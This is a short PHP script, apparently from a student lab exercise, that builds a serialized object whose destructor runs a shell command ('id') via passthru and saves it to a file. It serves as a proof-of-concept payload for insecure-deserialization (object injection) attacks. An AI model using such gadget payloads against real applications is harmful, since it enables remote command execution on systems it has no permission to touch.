<?php 
	class DangerousClass { 
		function __construct() { 
			$this->cmd="id";
	} 
	function __destruct() { 
		echo passthru($this->cmd); 
		} 
	} 
	$a = new DangerousClass(); 
	$b = serialize($a); 
	file_put_contents("serial_Nhom8", $b); 
?> 
